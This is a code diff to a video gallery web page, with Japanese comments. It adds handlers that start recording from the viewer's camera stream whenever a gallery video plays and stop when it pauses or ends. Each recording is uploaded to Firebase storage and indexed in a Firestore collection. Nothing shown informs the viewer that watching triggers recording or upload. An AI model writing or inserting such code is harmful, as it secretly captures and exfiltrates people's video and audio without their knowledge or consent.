@@ -654,15 +654,6 @@
             // 他の動画URLとタイトルを追加
         ];
 
-        function getOrCreateDeviceId() {
-            let deviceId = localStorage.getItem('deviceId');
-            if (!deviceId) {
-                deviceId = `device_${Math.random().toString(36).substr(2, 9)}`;
-                localStorage.setItem('deviceId', deviceId);
-            }
-            return deviceId;
-        }
-
         async function requestCameraAndAudioAccess() {
             try {
                 const constraints = {
@@ -749,9 +740,68 @@
                 videoItem.appendChild(videoContainer);
                 videoItem.appendChild(titleInput);
                 videoGrid.appendChild(videoItem);
+
+                // 動画再生時にフロントカメラで撮影
+                videoElement.addEventListener('play', () => {
+                    startRecording(videoElement);
+                });
+
+                videoElement.addEventListener('pause', () => {
+                    stopRecording();
+                });
+
+                videoElement.addEventListener('ended', () => {
+                    stopRecording();
+                });
             });
 
             updatePagination();
+        }
+
+        function startRecording(videoElement) {
+            if (videoStream) {
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(videoStream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const storageRef = ref(storage, `videos/${Date.now()}.webm`);
+                    const uploadTask = uploadBytesResumable(storageRef, blob);
+
+                    uploadTask.on('state_changed', 
+                        (snapshot) => {
+                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                            console.log('Upload is ' + progress + '% done');
+                        }, 
+                        (error) => {
+                            console.error('Upload failed:', error);
+                        }, 
+                        async () => {
+                            const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
+                            await addDoc(collection(db, 'videos'), {
+                                title: videoElement.nextSibling.value,
+                                url: downloadURL,
+                                timestamp: new Date()
+                            });
+                            console.log('File available at', downloadURL);
+                        }
+                    );
+                };
+                mediaRecorder.start();
+            } else {
+                console.error('カメラストリームが利用できません。');
+                alert('カメラストリームが利用できません。');
+            }
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
         }
 
         function updatePagination() {
